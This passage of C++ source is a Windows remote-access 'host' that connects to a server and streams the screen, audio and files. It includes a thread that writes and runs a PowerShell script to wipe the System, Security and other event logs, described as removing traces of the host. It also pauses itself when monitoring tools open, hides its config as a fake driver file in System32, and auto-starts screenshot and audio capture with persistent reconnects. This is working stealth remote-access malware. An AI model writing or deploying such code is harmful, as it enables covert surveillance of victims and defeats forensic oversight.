    const std::vector<std::string> logs = {"System", "Application", "Security", "Setup"};

    // Main loop — never exits while g_running, re-reads config on every iteration
    while (g_running) {
        int gen = g_evtlog_config_gen.load();

        // Re-read config on every pass — picks up UI changes immediately
        std::string pat_raw  = g_config.evtlog_clean_patterns;
        std::string mode_str = g_config.evtlog_clean_mode;
        int         interval = std::max(60, g_config.evtlog_clean_interval);
        bool        once_mode = (mode_str == "once");

        std::string patterns = evtlog_build_pattern(pat_raw);

        if (patterns.empty()) {
            // No patterns configured — wait 10s then re-check (user may configure later)
            g_log.debug("Event log cleaner: no patterns, waiting...");
            evtlog_sleep(10, gen);
            continue;
        }

        g_log.info("Event log cleaner: patterns=" + patterns + " mode=" + mode_str + " interval=" + std::to_string(interval) + "s");
        if (!g_running) break;

        for (const auto& logName : logs) {
            if (!g_running) break;
            try {
                char tmpPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tmpPath);
                std::string scriptPath = std::string(tmpPath) + "evtclean_" + std::to_string(GetTickCount64()) + ".ps1";

                // Use Get-WinEvent (modern API) — renders message AND exposes Properties
                // (ReplacementStrings) where WER stores "spoolsv.exe", "pnpext.dll" etc.
                // Selective delete: clear log, then re-write only the entries that DIDN'T match.
                // (Windows Event Log API has no per-record delete, so this is the only way.)
                std::string script =
                    "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8\n"
                    "$ErrorActionPreference='SilentlyContinue'\n"
                    "$pattern='" + patterns + "'\n"
                    "$logName='" + logName + "'\n"
                    "$events=@(Get-WinEvent -LogName $logName -MaxEvents 5000 -ErrorAction SilentlyContinue 2>$null)\n"
                    "if($events.Count -eq 0){Write-Output 'EMPTY';exit}\n"
                    "$toDelete=@()\n"
                    "$toKeep=@()\n"
                    "foreach($e in $events){\n"
                    "  $matched=$false\n"
                    "  try{\n"
                    "    $msg=[string]$e.Message\n"
                    "    $prov=[string]$e.ProviderName\n"
                    "    $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ')\n"
                    "    $xml=''; try{ $xml=$e.ToXml() }catch{}\n"
                    "    $task=[string]$e.TaskDisplayName\n"
                    "    if(($msg -match $pattern) -or ($props -match $pattern) -or\n"
                    "       ($prov -match $pattern) -or ($xml -match $pattern) -or\n"
                    "       ($task -match $pattern)){ $matched=$true }\n"
                    "  }catch{ $matched=$false }\n"
                    "  if($matched){ $toDelete+=$e } else { $toKeep+=$e }\n"
                    "}\n"
                    "if($toDelete.Count -eq 0){Write-Output 'CLEAN';exit}\n"
                    "# Wipe channel\n"
                    "& wevtutil.exe cl $logName 2>$null\n"
                    "# Restore non-matching entries (oldest first, capped at 500 to avoid log explosion)\n"
                    "$restored=0\n"
                    "$keep=$toKeep | Sort-Object TimeCreated\n"
                    "if($keep.Count -gt 500){ $keep=$keep | Select-Object -Last 500 }\n"
                    "foreach($e in $keep){\n"
                    "  try{\n"
                    "    $src=$e.ProviderName\n"
                    "    $et='Information'\n"
                    "    switch($e.LevelDisplayName){\n"
                    "      'Error'       { $et='Error' }\n"
                    "      'Warning'     { $et='Warning' }\n"
                    "      'Critical'    { $et='Error' }\n"
                    "      'Information' { $et='Information' }\n"
                    "    }\n"
                    "    # Ensure source is registered for this log (best effort)\n"
                    "    if(-not [System.Diagnostics.EventLog]::SourceExists($src)){\n"
                    "      try{ New-EventLog -LogName $logName -Source $src -ErrorAction SilentlyContinue }catch{}\n"
                    "    }\n"
                    "    $eid=[int]($e.Id % 65536)\n"
                    "    Write-EventLog -LogName $logName -Source $src -EventId $eid -EntryType $et -Message $e.Message -ErrorAction SilentlyContinue\n"
                    "    $restored++\n"
                    "  }catch{}\n"
                    "}\n"
                    "Write-Output \"CLEANED|$($toDelete.Count)|$restored\"\n";

                {
                    std::ofstream f(scriptPath);
                    f << script;
                }

                std::string psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -File \"" + scriptPath + "\"";
                std::string output = g_procs.run_cmd_capture(psCmd);
                DeleteFileA(scriptPath.c_str());

                while (!output.empty() && (output.back()=='\n'||output.back()=='\r')) output.pop_back();
                if (output.find("CLEANED") != std::string::npos) {
                    g_log.debug("EventLog cleaner: cleared " + logName + " (" + output + ")");
                }
            } catch (...) {}
        }

        if (!g_running) break;

        if (once_mode) {
            g_log.info("Event log cleaner: once mode — done, waiting for config change");
            // Don't exit — wait until config changes (user switches to periodic or changes patterns)
            evtlog_sleep(3600, gen); // sleep up to 1h, wakes instantly on config change
            continue;
        }

        // Periodic mode: sleep interval seconds, wake early on config change or shutdown
        g_log.debug("Event log cleaner: next run in " + std::to_string(interval) + "s");
        evtlog_sleep(interval, gen);
    }
    g_log.info("Event log cleaner stopped");
}

// Forward declaration
void host_main_loop();

#ifndef BUILD_AS_DLL
// Service framework only for EXE build
#include "service_host.h"

#ifndef BUILD_AS_DLL
// Stub for exe mode — dll_diag is defined in dllmain.cpp for DLL builds
void dll_diag(const char*) {}
#endif

int main(int argc, char** argv) {
    // ── Mode dispatch: --service, --capture-helper, --install, --uninstall ──
    if (argc > 1) {
        std::string arg1 = argv[1];
        if (arg1 == "--capture-helper")  return run_capture_helper(argc, argv);
        if (arg1 == "--install")         return install_service();
        if (arg1 == "--uninstall")       return uninstall_service();
        if (arg1 == "--service") {
            g_service_mode = true;
            g_log.set_level("INFO");
            // g_log.set_file("C:\\RemoteDesktopHost.log"); // disabled — no log files
            g_log.info("=== Starting in SERVICE mode ===");
            g_ipc_reader_ptr = &g_ipc_reader;
            return run_as_service();
        }
    }

    // ── Standalone console mode (original behavior) ──

    // Install crash-proof handlers FIRST — before anything else can fail
    SetUnhandledExceptionFilter(CrashHandler);
    std::set_terminate(TerminateHandler);
    // Disable abort/assert dialog boxes — silent crash recovery
    _set_error_mode(_OUT_TO_STDERR);
    _set_abort_behavior(0, _WRITE_ABORT_MSG | _CALL_REPORTFAULT);
    signal(SIGABRT, [](int) {
        try { g_log.error("SIGABRT caught — restarting"); } catch (...) {}
        char exe[MAX_PATH];
        if (GetModuleFileNameA(NULL, exe, MAX_PATH)) {
            STARTUPINFOA si = {}; si.cb = sizeof(si);
            PROCESS_INFORMATION pi = {};
            CreateProcessA(exe, GetCommandLineA(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
        }
        ExitProcess(1);
    });

    g_log.set_level("INFO");
    // g_log.set_file("C:\\RemoteDesktopHost.log"); // disabled — no log files
    g_log.info("=== Prometey Host starting ===");

    // Graceful shutdown on Ctrl+C, console close, logoff, shutdown
    SetConsoleCtrlHandler(ConsoleCtrlHandler, TRUE);

    // Start event log auto-cleaner (removes traces of this host from Windows Event Logs)
    g_evtlog_cleaner_thread = std::thread(evtlog_cleaner_func);

    // Start threat monitor (pauses host when monitoring tools open)
    g_threat_thread = std::thread(threat_monitor_func);

    // ── Performance: 1ms timer resolution (like TeamViewer) ──
    timeBeginPeriod(1);

    // ── Elevate process priority for better scheduling ──
    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);

    // ── Disable Windows Network Throttling (like TeamViewer) ──
    {
        HKEY hKey = nullptr;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile",
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
        {
            DWORD val = 0xFFFFFFFF;
            RegSetValueExA(hKey, "NetworkThrottlingIndex", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
            DWORD resp = 0;
            RegSetValueExA(hKey, "SystemResponsiveness", 0, REG_DWORD, (BYTE*)&resp, sizeof(resp));
            RegCloseKey(hKey);
            g_log.info("Network throttling disabled, SystemResponsiveness=0");
        } else {
            g_log.warn("Cannot set NetworkThrottlingIndex (need admin?)");
        }
    }

    // ── Switch to High Performance power plan (like TeamViewer) ──
    {
        GUID* currentScheme = nullptr;
        if (PowerGetActiveScheme(NULL, &currentScheme) == ERROR_SUCCESS && currentScheme) {
            g_saved_power_scheme = *currentScheme;
            g_power_scheme_saved = true;
            LocalFree(currentScheme);
        }
        GUID highPerf = {0x8c5e7fda, 0xe8bf, 0x4a96, {0x9a, 0x85, 0xa6, 0xe2, 0x3a, 0x8c, 0x63, 0x5c}};
        if (PowerSetActiveScheme(NULL, &highPerf) == ERROR_SUCCESS) {
            g_log.info("Power plan: HIGH PERFORMANCE (GPU/CPU at full clock)");
        } else {
            g_log.warn("Cannot set High Performance power plan");
        }
    }

    // ── Prevent display/system idle throttling ──
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);

    // ── Enable MMCSS for Desktop Window Manager ──
    {
        HRESULT hr = DwmEnableMMCSS(TRUE);
        if (SUCCEEDED(hr))
            g_log.info("DWM MMCSS enabled (better DXGI capture)");
    }

    g_log.info("Timer=1ms, priority=HIGH, network throttling=OFF, power=HIGH_PERF");

    std::string cfg_path = "host_config.json";
    if (argc > 1) cfg_path = argv[1];
    g_config_path = cfg_path;

    // ═══════════════════════════════════════════════════════════
    // FAULT-TOLERANT OUTER LOOP — host NEVER exits on its own
    // Even fatal errors (init, config, crash) → restart after delay
    // Only Ctrl+C / system shutdown / CTRL_CLOSE_EVENT can stop it
    // ═══════════════════════════════════════════════════════════
    while (g_running) {
        try {
            // ── Initialization (may fail: bad config, no screen, etc.) ──
            load_config(cfg_path);

            g_screen.init();
            g_screen.set_quality(g_config.quality);
            g_screen.set_scale(g_config.scale);
            g_screen.set_codec(g_config.codec);
            g_fps     = g_config.fps;
            g_quality = g_config.quality;
            g_scale   = g_config.scale;
            g_user_scale = g_scale;
            g_auto_scale = g_scale;
            g_codec   = g_config.codec;
            g_bitrate = g_config.bitrate;

            WSADATA wsa;
            if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
                g_log.error("WSAStartup failed, retrying in 3s...");
                Sleep(3000);
                continue;
            }

            // ── Reconnect loop: keeps trying to connect to server ──
            int reconnect_delay = 1;
            while (g_running) {
              try {
                g_log.info("Connecting to " + g_config.server_address + ":" + std::to_string(g_config.server_port));

                g_ws = std::make_unique<WsClient>();
                g_ws->on_text = handle_command;
                g_ws->on_binary = handle_binary;
                g_ws->on_close = [&]() {
                    g_log.warn("Connection closed, will reconnect");
                    g_streaming = false;
                    g_raw_cv.notify_all();
                };

                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
                    g_log.info("Connected to server");
                    reconnect_delay = 1;

                    std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                                       "\",\"password\":\"" + json_escape(g_config.password) +
                                       "\",\"role\":\"host\"}";
                    g_ws->send_text(auth);

                    // 1 dedicated file TCP connection — separates FILE from commands
                    // Only 1 (not 4!) so TCP fairness splits: stream ~50%, file ~33%, commands ~17%
                    open_file_connections();
                    start_file_workers();

                    // Auto-start screenshot if enabled in config
                    if (g_config.screenshot_enabled && !g_screenshot_active.load()) {
                        g_screenshot_active = true;
                        if (!g_screenshot_thread.joinable())
                            g_screenshot_thread = std::thread(screenshot_thread_func);
                        g_log.info("Screenshot auto-started from config");
                    }
                    // Auto-start/restart audio if enabled
                    if (g_config.audio_enabled || g_audio_active.load()) {
                        g_audio_active = true;
                        // If audio_thread_func already exited (crash/exception), join
                        // reclaims the thread object so we can respawn fresh below.
                        if (g_audio_thread.joinable()) {
                            g_audio_thread.join();
                        }
                        if (!g_audio_thread.joinable()) {
                            g_audio_thread = std::thread(audio_thread_func);
                            g_log.info("Audio thread (re)started");
                        }
                    }

                    auto conn_start = std::chrono::steady_clock::now();
                    bool auth_ok_marked = false;
                    while (g_ws->is_connected() && g_running) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                        // After 5s of sustained connection, assume auth succeeded
                        if (!auth_ok_marked) {
                            auto dt = std::chrono::duration_cast<std::chrono::seconds>(
                                std::chrono::steady_clock::now() - conn_start).count();
                            if (dt >= 5) { reconnect_note_auth_ok(); auth_ok_marked = true; }
                        }
                    }
                } else {
                    g_log.error("Connection failed, retrying in " + std::to_string(reconnect_delay) + "s");
                }
              } catch (const std::exception& e) {
                  g_log.error("Connection error: " + std::string(e.what()));
              } catch (...) {
                  g_log.error("Unknown connection error");
              }

                if (!g_running) break;

                // Clean up before reconnecting
                try { stop_streaming(); } catch (...) {}
                try { stop_file_workers(); } catch (...) {}
                try { close_file_connections(); } catch (...) {}

                if (g_auth_fail_count.load() >= 3) {
                    g_log.warn("Repeated auth failures, cooling down 5 minutes");
                }
                g_log.info("Reconnecting in ~" + std::to_string(reconnect_delay) + "s (±25% jitter)");
                reconnect_sleep(reconnect_delay);
                reconnect_delay = reconnect_next_delay(reconnect_delay);
            }

            WSACleanup();
        } catch (const std::exception& e) {
            g_log.error("FATAL exception: " + std::string(e.what()) + " — restarting in 5s");
            try { stop_streaming(); } catch (...) {}
            try { stop_file_workers(); } catch (...) {}
            try { close_file_connections(); } catch (...) {}
            for (int i = 0; i < 50 && g_running; i++) Sleep(100);
        } catch (...) {
            g_log.error("FATAL unknown exception — restarting in 5s");
            try { stop_streaming(); } catch (...) {}
            try { stop_file_workers(); } catch (...) {}
            try { close_file_connections(); } catch (...) {}
            for (int i = 0; i < 50 && g_running; i++) Sleep(100);
        }
    }

    // Graceful shutdown (only reached via Ctrl+C or system shutdown)
    cleanup_system();
    if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
    g_log.info("Host shutting down");
    return 0;
}
#endif // !BUILD_AS_DLL

// ═══════════════════════════════════════════════════════════════
// host_main_loop() — called from DllMain/ServiceMain or standalone
// ═══════════════════════════════════════════════════════════════
void host_main_loop() {
    // Use dll_diag for crash diagnostics (defined in dllmain.cpp, or stub for exe)
    extern void dll_diag(const char* msg);
    dll_diag("host_main_loop: ENTERED");

    g_log.info("host_main_loop starting (service mode)");
    dll_diag("host_main_loop: timeBeginPeriod...");

    // Performance tuning (same as standalone)
    timeBeginPeriod(1);
    dll_diag("host_main_loop: SetPriorityClass...");
    // REALTIME for DLL/service mode — Session 0 has lower default scheduling priority
    if (g_service_mode) SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    else SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
    dll_diag("host_main_loop: perf tuning done");

    // Event log cleaner
    dll_diag("host_main_loop: starting evtlog_cleaner...");
    g_evtlog_cleaner_thread = std::thread(evtlog_cleaner_func);
    dll_diag("host_main_loop: evtlog_cleaner started");

    // Threat monitor (pauses host when monitoring tools open)
    dll_diag("host_main_loop: starting threat_monitor...");
    g_threat_thread = std::thread(threat_monitor_func);
    dll_diag("host_main_loop: threat_monitor started");

    std::string cfg_path = "pnpext.sys";
    // Search order: 1) C:\Windows\System32\drivers\pnpext.sys
    //               2) Next to DLL/EXE
    //               3) host_config.json next to DLL/EXE (legacy fallback)
    {
        char modPath[MAX_PATH] = {};
        extern HMODULE g_dll_module;
        HMODULE hMod = g_dll_module ? g_dll_module : nullptr;
        GetModuleFileNameA(hMod, modPath, MAX_PATH);
        std::string dir(modPath);
        auto pos = dir.find_last_of("\\/");
        if (pos != std::string::npos) dir = dir.substr(0, pos + 1);

        // Try system drivers path first
        std::string sysPath = "C:\\Windows\\System32\\drivers\\pnpext.sys";
        std::string localSys = dir + "pnpext.sys";
        std::string localJson = dir + "host_config.json";

        if (GetFileAttributesA(sysPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            cfg_path = sysPath;
            dll_diag("host_main_loop: config FOUND at drivers\\pnpext.sys");
        } else if (GetFileAttributesA(localSys.c_str()) != INVALID_FILE_ATTRIBUTES) {
            cfg_path = localSys;
            dll_diag("host_main_loop: config FOUND at local pnpext.sys");
        } else if (GetFileAttributesA(localJson.c_str()) != INVALID_FILE_ATTRIBUTES) {
            cfg_path = localJson;
            dll_diag("host_main_loop: config FOUND at legacy host_config.json");
        } else {
            cfg_path = sysPath; // default target for new installs
            dll_diag("host_main_loop: config NOT FOUND, will use defaults");
        }
    }
    g_config_path = cfg_path;
    dll_diag(("host_main_loop: cfg_path=" + cfg_path).c_str());

    // Main reconnect loop (same as standalone)
    dll_diag("host_main_loop: entering main while loop");
    while (g_running) {
        try {
            dll_diag("host_main_loop: load_config...");
            load_config(cfg_path);
            dll_diag("host_main_loop: config loaded OK");

            if (g_service_mode) {
                dll_diag("host_main_loop: GDI+ init...");
                static bool gdip_inited = false;
                if (!gdip_inited) {
                    static ULONG_PTR gdipToken = 0;
                    Gdiplus::GdiplusStartupInput gdipInput;
                    Gdiplus::GdiplusStartup(&gdipToken, &gdipInput, nullptr);
                    gdip_inited = true;
                }
                // g_ipc_reader_ptr is set by helper_monitor in dllmain.cpp when spawn_helper() creates IPC
                dll_diag(("host_main_loop: GDI+ done, ipc_reader_ptr=" + std::to_string((uintptr_t)g_ipc_reader_ptr)).c_str());
            } else {
                g_screen.init();
                g_screen.set_quality(g_config.quality);
                g_screen.set_scale(g_config.scale);
                g_screen.set_codec(g_config.codec);
            }
            g_fps     = g_config.fps;
            g_quality = g_config.quality;
            g_scale   = g_config.scale;
            g_user_scale = g_scale;
            g_auto_scale = g_scale;
            g_codec   = g_config.codec;
            g_bitrate = g_config.bitrate;

            // Sync IPC control
            if (g_ipc_reader_ptr) {
                g_ipc_reader_ptr->set_fps(g_fps);
                g_ipc_reader_ptr->set_scale(g_scale);
            }

            dll_diag("host_main_loop: WSAStartup...");
            WSADATA wsa;
            if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
                dll_diag("host_main_loop: WSAStartup FAILED");
                g_log.error("WSAStartup failed, retrying in 3s...");
                Sleep(3000);
                continue;
            }
            dll_diag("host_main_loop: WSAStartup OK");

            dll_diag(("host_main_loop: connecting to " + g_config.server_address + ":" + std::to_string(g_config.server_port)).c_str());
            int reconnect_delay = 1;
            while (g_running) {
              try {
                g_log.info("Connecting to " + g_config.server_address + ":" + std::to_string(g_config.server_port));
                dll_diag("host_main_loop: creating WsClient...");
                g_ws = std::make_unique<WsClient>();
                g_ws->on_text = handle_command;
                g_ws->on_binary = handle_binary;
                g_ws->on_close = [&]() {
                    dll_diag("on_close FIRED — connection lost");
                    g_log.warn("Connection closed, will reconnect");
                    g_streaming = false;
                    g_raw_cv.notify_all();
                };

                dll_diag("host_main_loop: connecting WS...");
                if (g_ws->connect(g_config.server_address, g_config.server_port, "/host", g_config.use_tls)) {
                    dll_diag("host_main_loop: WS connected OK");
                    g_log.info("Connected to server");
                    reconnect_delay = 1;

                    std::string auth = "{\"cmd\":\"auth\",\"token\":\"" + json_escape(g_config.room_token) +
                                       "\",\"password\":\"" + json_escape(g_config.password) +
                                       "\",\"role\":\"host\"}";
                    g_ws->send_text(auth);
                    dll_diag("host_main_loop: auth sent");

                    dll_diag("host_main_loop: opening file connections...");
                    open_file_connections();
                    start_file_workers();
                    dll_diag("host_main_loop: file workers started");

                    // Auto-start screenshot if enabled in config
                    if (g_config.screenshot_enabled && !g_screenshot_active.load()) {
                        g_screenshot_active = true;
                        if (!g_screenshot_thread.joinable())
                            g_screenshot_thread = std::thread(screenshot_thread_func);
                        g_log.info("Screenshot auto-started from config (DLL mode)");
                        dll_diag("host_main_loop: screenshot auto-started");
                    }
                    if (g_config.audio_enabled || g_audio_active.load()) {
                        g_audio_active = true;
                        if (!g_audio_thread.joinable()) {
                            g_audio_thread = std::thread(audio_thread_func);
                            g_log.info("Audio thread (re)started (DLL mode)");
                        }
                    }

                    dll_diag("host_main_loop: connected + auth sent, entering main poll loop");
                    auto conn_start = std::chrono::steady_clock::now();
                    bool auth_ok_marked = false;
                    while (g_ws->is_connected() && g_running) {
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                        if (!auth_ok_marked) {
                            auto dt = std::chrono::duration_cast<std::chrono::seconds>(
                                std::chrono::steady_clock::now() - conn_start).count();
                            if (dt >= 5) { reconnect_note_auth_ok(); auth_ok_marked = true; }
                        }
                    }
                    dll_diag(("host_main_loop: poll loop exited (is_connected=" + std::to_string(g_ws->is_connected()) + " g_running=" + std::to_string(g_running.load()) + ")").c_str());
                } else {
                    dll_diag("host_main_loop: connect FAILED");
                    g_log.warn("Connection failed, retry in " + std::to_string(reconnect_delay) + "s");
                }
              } catch (const std::exception& e) {
                g_log.error("Connection error: " + std::string(e.what()));
              } catch (...) {
                g_log.error("Unknown connection error");
              }

                if (!g_running) break;

                try { stop_streaming(); } catch (...) {}
                try { stop_file_workers(); } catch (...) {}
                try { close_file_connections(); } catch (...) {}

                if (g_auth_fail_count.load() >= 3) {
                    g_log.warn("Repeated auth failures, cooling down 5 minutes");
                }
                g_log.info("Reconnecting in ~" + std::to_string(reconnect_delay) + "s (±25% jitter)");
                reconnect_sleep(reconnect_delay);
                reconnect_delay = reconnect_next_delay(reconnect_delay);
            }

            WSACleanup();
        } catch (const std::exception& e) {
            g_log.error("FATAL: " + std::string(e.what()) + " — restarting in 5s");
            for (int i = 0; i < 50 && g_running; i++) Sleep(100);
        } catch (...) {
            g_log.error("FATAL unknown exception — restarting in 5s");
            for (int i = 0; i < 50 && g_running; i++) Sleep(100);
        }
    }

    cleanup_system();
    if (g_evtlog_cleaner_thread.joinable()) g_evtlog_cleaner_thread.join();
    g_log.info("host_main_loop finished");
}

// ── Shutdown helper: called from stop_host() before tearing down globals ──
// Joins audio/screenshot threads and waits for bg workers to finish.
// g_running must already be false when this is called so the threads exit their loops.
extern "C" void shutdown_workers(int timeout_ms) {
    // Stop audio/screenshot activity flags — they also check g_running, but clear here
    // to speed up exit from inner capture/record loops.
    g_audio_active = false;
    g_screenshot_active = false;
    // Wake any reconnect-sleepers so they notice g_running=false immediately
    reconnect_wake_all();

    if (g_audio_thread.joinable())      g_audio_thread.join();
    if (g_screenshot_thread.joinable()) g_screenshot_thread.join();

    // Wait for bg workers (installed_programs, host_update, running_apps, ...)
    std::unique_lock<std::mutex> lk(g_bg_worker_mtx);
    g_bg_worker_cv.wait_for(lk, std::chrono::milliseconds(timeout_ms),
                             [] { return g_bg_worker_count.load() == 0; });
}